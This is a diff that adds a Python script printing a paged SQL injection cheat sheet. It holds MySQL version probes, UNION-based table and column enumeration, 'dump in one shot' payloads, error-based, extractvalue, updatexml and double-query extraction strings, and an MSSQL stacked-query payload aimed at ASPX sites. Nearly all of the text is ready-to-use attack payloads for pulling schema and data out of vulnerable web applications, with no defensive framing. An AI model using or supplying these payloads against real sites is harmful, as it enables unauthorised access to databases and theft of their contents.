@@ -1,0 +1,326 @@
+#!/usr/bin/python3
+# Console colors
+bg ='' # '\033[44m'  # gray
+W = bg+'\033[0m'  # white (normal)
+R = bg+'\033[31m'  # red
+B = bg+'\033[32m'  # green
+O = bg+'\033[33m'  # orange
+G = bg+'\033[34m'  # blue
+P = bg+'\033[35m'  # purple
+C = bg+'\033[36m'  # cyan
+GR = bg+'\033[37m'  # gray
+WR= '\033[1;30m'
+Y="\033[33m"
+
+
+try:
+    from threading import Thread
+    import sqlite3
+    import urllib.parse
+    import os,time,sys
+    from datetime import datetime
+    now = datetime.now()   
+
+
+ 
+except ImportError as e:
+    print(R+'[!] Module %s not found install it ... '%str(e).split()[-4])
+    exit()
+
+
+clear = lambda: os.system('clear')
+note="""
+-|----------------------------------------------------------------------------|-
+ |: Using Apostrophe [']
+ |: Using Quotation mark [?]
+ |: Using English Alphabet [A]
+ |: Using Single Quote / Quotation mark / English Alphabet {['],[?],[A]}
+ |: add Point before the variable number and add Apostrophe after it [.x']
+ |: add Point before and after variable number at the same time  [.x.]
+ |: Add the Apostrophe before the variable number  [']
+ |: Delete the variable number and add the Apostrophe only [']
+ |: Delete the variable number and add a slash  [/]
+ |: Using Logical expressions  [and 1=1]
+-|----------------------------------------------------------------------------|-
+
+"""
+
+clear()
+print(note)
+
+
+input("[Pres Enter]")
+clear()
+
+check_version="""
+----------------------------------------------------------------------------
+ AND MID(VERSION(),1,1) = '3';
+ AND MID(VERSION(),1,1) = '4';
+ AND MID(VERSION(),1,1) = '5';
+----------------------------------------------------------------------------
+ and substring(version(),1,1)=3
+ and substring(version(),1,1)=4
+ and substring(version(),1,1)=5
+----------------------------------------------------------------------------
+ and substring(version(),1,1)=8
+ and substring(version(),1,1)=9
+ and substring(version(),1,1)=10
+----------------------------------------------------------------------------
+ and substring(Version(),1,1)like(3)
+ and substring(Version(),1,1)like(4)
+ and substring(Version(),1,1)like(5)
+ and substring(Version(),1,1)not in(4,3)
+ and substring(Version(),1,1)in(4,3)
+----------------------------------------------------------------------------
+"""
+print(check_version)
+
+
+level1="""
+
+order by 100 -- -
+----------------------------------------------------------------------------
+union select 1,2,3,4,5,6,7,8,9,10,version() -- -
+----------------------------------------------------------------------------
+union select 1,2,table_name, froM InfORmaTion_scHema.tAblES  -- -
+----------------------------------------------------------------------------
+union select table_name froM InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
+----------------------------------------------------------------------------
+union select group_concat(table_name) froM InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
+----------------------------------------------------------------------------
+#http://www.waraxe.us/sql-char-encoder.html
+----------------------------------------------------------------------------
+union select group_concat(column_name) froM InfORmaTion_scHema.cOlumnS WheRe tAblE_naMe=0x6c6f63616c5f61726561 -- -
+----------------------------------------------------------------------------
+union select group_concat(column,0x3a,column) from YOUR TABLE NAME  -- - 
+----------------------------------------------------------------------------
+"""
+
+input("[Pres Enter]")
+
+clear()
+print(level1)
+
+
+
+#----------------------------------------------------------------------------
+# LEVEL 
+#----------------------------------------------------------------------------
+
+
+level2="""
+--------------------------------------------------------------------------------------------------------------------------
+#__TA__ HEX
+----------------------------------
+(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=__TA__ )and(0x00)in(@x:=concat(@x,0x3c62723e,table_schema,0x2e,table_name,0x3a,column_name))))x)
+--------------------------------------------------------------------------------------------------------------------------
+#__TA__ ~~ __C1__~~ __C2__
+----------------------------------
+(select(@) from (select (@:=0x00),(select (@) from (__TA__) where (@) in (@:=concat(@,0x0a,__C1__,0x3a,__C2__))))a)
+--------------------------------------------------------------------------------------------------------------------------
+#DIOS Advanced
+<----------------->
+concat( @n_d:=0x00,@i:=0x00,@o:=0x00,if( benchmark( (select count(*) from information_schema.schemata), @o:=CONCAT(@o,(Select concat( 0x266e6273703b,LPAD(@n_d:=@n_d%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d7265643e3c623e,@i:=schema_name,0x3c2f623e20286e756d626572206f66207461626c657320696e2064617461626173653a20,@NumberOfDatabases:=(select count(*) from information_schema.tables where table_schema=@i),0x293c2f666f6e743e,0x3c62723e,
+concat(@n_t:=0x00,@tbl:=0x00,@out_tbl:=0x00,if( benchmark( @NumberOfDatabases,@out_tbl:=CONCAT( @out_tbl,( Select concat( repeat(0x266e6273703b,8),LPAD(@n_t:=@n_t%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d677265656e3e3c623e,@tbl:=table_name,0x3c2f623e20286e756d626572206f6620636f6c756d6e7320696e207461626c653a20,@NumberOfColumns:=(select count(*) from information_schema.columns where table_schema=@i and table_name=@tbl),0x293c2f666f6e743e,concat( @n_c:=0x00,@clm:=0x00,@clm_out:=0x00,if( benchmark( @NumberOfColumns,@clm_out:=CONCAT( @clm_out,0x3c62723e,repeat(0x266e6273703b ,16),LPAD(@n_c:=@n_c%2b1,3,0x30),0x2e20203c666f6e7420636f6c6f723d626c75653e,(Select (@clm:=column_name) from information_schema.columns where (table_name=@tbl) and column_name>@clm order by column_name LIMIT 1),0x3c2f666f6e743e))=0, @clm_out, 0x00), 0x3c62723e)) from information_schema.tables where table_schema=@i and table_name>@tbl order by table_name LIMIT 1)))=0, @out_tbl, 0x00))) from information_schema.schemata where schema_name>@i order by schema_name LIMIT 1)))=0,@o,0x00))
+--------------------------------------------------------------------------------------------------------------------------
+#__TA__ ~~ __C1__~~ __C2__
+----------------------------------
+(select(@) from (select (@:=0x00),(select (@) from (table) where (@) in (@:=concat(@,0x0a,column1,0x3a,column2))))a)
+--------------------------------------------------------------------------------------------------------------------------
+CASE statement
+
+(select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select CASE WHEN ( (select  count(*) from information_schema.columns where table_name=@tbl and  column_name like 0x257061737325)>0) THEN  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a2070617373202a2a2a203c2f623e3c666f6e7420636f6c6f723d6
+26c75653e else 0x00 END)))))x) 
+--------------------------------------------------------------------------------------------------------------------------
+IF() function
+ 
+(select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select IF(( select count(*)  from information_schema.columns where table_name=@tbl and column_name  like 0x257061737325 >0),  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a2070617373202a2a2a203c2f623e3c666f6e7420636f6c6f723d6
+26c75653e, 0x00))))))x)
+--------------------------------------------------------------------------------------------------------------------------"""
+clear()
+print(level2)
+input("[Pres Enter]")
+
+clear()
+error_based="""
+input("[Pres Enter]")
+--------------------------------------------------------------------------------------------------------------------------
+                                                error_based
+--------------------------------------------------------------------------------------------------------------------------
+: Version :
+ or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1-- -
+ --------------------------------------------------------------------------------------------------------------------------
+: Tables 
+~~ __limit 0,1__~~
+----------------------------------
+ or 1 group by concat_ws(0x7e,(select table_name from information_schema.tables ​where table_schema=database() limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
+ --------------------------------------------------------------------------------------------------------------------------
+: Columns 
+-------------------
+~~ __T.Hex__~~
+----------------------------------
+ or 1 group by concat_ws(0x7e,(select column_name from information_schema.column​s where table_name=__T.Hex__ limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
+ --------------------------------------------------------------------------------------------------------------------------
+: Getting Data From The Columns
+ --------------------------------------------------------------------------------------------------------------------------
+ #__TA__ ~~ __C1__~~ __C2__
+----------------------------------
+ or 1 group by concat_ws(0x7e,(select concat(__C1__,0x7e,__C2__) from __TA__ limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
+--------------------------------------------------------------------------------------------------------------------------
+
+"""
+
+
+clear()
+print(error_based)
+input("[Pres Enter]")
+
+clear()
+xpath_Injection="""
+input("[Pres Enter]")
+--------------------------------------------------------------------------------------------------------------------------
+                                                xpath Injection
+--------------------------------------------------------------------------------------------------------------------------
+: version 
+ 
+ and extractvalue(rand(),concat(0x7e,version()))-- - 
+ --------------------------------------------------------------------------------------------------------------------------
+: Tables :
+~~ __limit 0,1__~~
+----------------------------------
+ and extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
+ --------------------------------------------------------------------------------------------------------------------------
+: column :
+-------------------
+~~ __T.Hex__~~
+---------------------------------- 
+and extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
+ 
+ and extractvalue(rand(),concat(0x7e,(select column_name from information_schema.columns where table_name=__T.Hex__ limit 0,1)))-- - 
+ --------------------------------------------------------------------------------------------------------------------------
+
+: Data :
+--------------------------------------------------------------------------------------------------------------------------
+  #__TA__ ~~ __C1__~~ __C2__
+----------------------------------
+
+ and extractvalue(rand(),concat(0x7e,(select concat( __C1__,0x7e,__C2__) from __TA__ limit 0,1)))-- -
+--------------------------------------------------------------------------------------------------------------------------
+* note remove any buk code  T&#8203;ABLENAME 
+--------------------------------------------------------------------------------------------------------------------------
+
+ """
+
+
+
+
+
+clear()
+print(xpath_Injection)
+input("[Pres Enter]")
+
+clear()
+
+
+xpath_UpdateXML="""
+--------------------------------------------------------------------------------------------------------------------------
+                                               xpath UpdateXML
+--------------------------------------------------------------------------------------------------------------------------
+#version
+and updatexml(0x7e,concat(0x7e,(version())),0)--
+and updatexml(1,/*!%0aconcat*/(0x7e,(/*!%0aSelEcT*/ version()),0x7e),1)
+--------------------------------------------------------------------------------------------------------------------------
+ 
+: Getting The Tables (UpdateXML)
+--------------------------------------------------------------------------------------------------------------------------
+ ~~ __limit 0,1__~~
+----------------------------------
+ and updatexml(0x7e,concat(0x7e,((select concat(table_name) from information_sch​ema.tables where table_schema=database() limit 0,1))),0)--
+ -------------------------------------------------------------------------------------------------------------------------- 
+:  Getting Columns (UpdateXML)
+--------------------------------------------------------------------------------------------------------------------------
+~~ __T.Hex__~~
+ ----------------------------------
+ and updatexml(0x7e,concat(0x7e,((select concat(column_name) from information_sc​hema.columns where table_name=~~ __T.Hex__~~ limit 0,1))),0)--
+ --------------------------------------------------------------------------------------------------------------------------
+:  Getting Data (UpdateXML)
+ --------------------------------------------------------------------------------------------------------------------------
+   #__TA__ ~~ __C1__~~ __C2__
+----------------------------------
+
+ and updatexml(0x7e,concat(0x7e,((select concat(__C1__,0x7e​,__C2__) from __TA__ limit 0,1))),0)--
+ --------------------------------------------------------------------------------------------------------------------------
+"""
+
+
+clear()
+print(xpath_UpdateXML)
+input("[Pres Enter]")
+
+clear()
+
+
+
+DOUBLE_Query_Injection="""
+--------------------------------------------------------------------------------------------------------------------------
+                                                DOUBLE Query Injection's
+--------------------------------------------------------------------------------------------------------------------------
+: version
+ 
+ and(select 1 from(select count(*),concat((select (select concat(version())) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+ --------------------------------------------------------------------------------------------------------------------------
+: Getting The DataBase  
+ 
+ and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+ -------------------------------------------------------------------------------------------------------------------------- 
+: Getting The Tables
+--------------------------------------------------------------------------------------------------------------------------   
+  ~~ __DB.Hex__~~
+----------------------------------
+ and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,concat(table_name),0x27,0x7e) from information_schema.tables where table_schema=__DB.Hex__limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+ --------------------------------------------------------------------------------------------------------------------------
+: Getting The Columns  
+--------------------------------------------------------------------------------------------------------------------------
+ ~~ __DB.Hex__~~ || ~~__TA__ ~~
+---------------------------------- 
+ and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns Where table_schema=__DB.Hex__ AND table_name=__TA__ LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+ --------------------------------------------------------------------------------------------------------------------------
+: Dump Data   
+--------------------------------------------------------------------------------------------------------------------------
+ ~~ __DB__~~ || ~~__TA__ ~~  ~~ __C1__~~ __C2__
+----------------------------------
+and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(__TA__.__C1__ as char),0x27,0x7e,cast(__TA__.__C2__ as char)) FROM `__DB__`.__TA__ LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+"""
+
+
+
+clear()
+print(DOUBLE_Query_Injection)
+input("[Pres Enter]")
+
+clear()
+
+
+ASPX_Site="""
+--------------------------------------------------------------------------------------------------------------------------
+							Begin Declare The DIOS For ASPX Site
+--------------------------------------------------------------------------------------------------------------------------
+The DIOS Table
+ --------------------------------------------------------------------------------------------------------------------------
+;begin declare @x varchar(8000),@y int,@z varchar(50),@a varchar(100) declare @myTbl table (name varchar(8000) not null)SET @y=1 SET @x='injected by Me :: '+@@version+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Database : '+db_name()+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl)select @a=@a + column_name+' : 'from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x +CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Table: '+@z+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Columns : '+@a+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)SET @y = @y+1 end select @x as output into BlackRose END--
+--------------------------------------------------------------------------------------------------------------------------
+ -------------------------------------------------------------------------------------------------------------------------
+OutPut Data
+----------------------------------->
+ and 1=convert(int,(select top 1 output from BlackRose))--
+--------------------------------------------------------------------------------------------------------------------------
+
+ select output  from BlackRose
+--------------------------------------------------------------------------------------------------------------------------
+ """
+
+
+clear()
+print(ASPX_Site)
+input("[Pres Enter]")
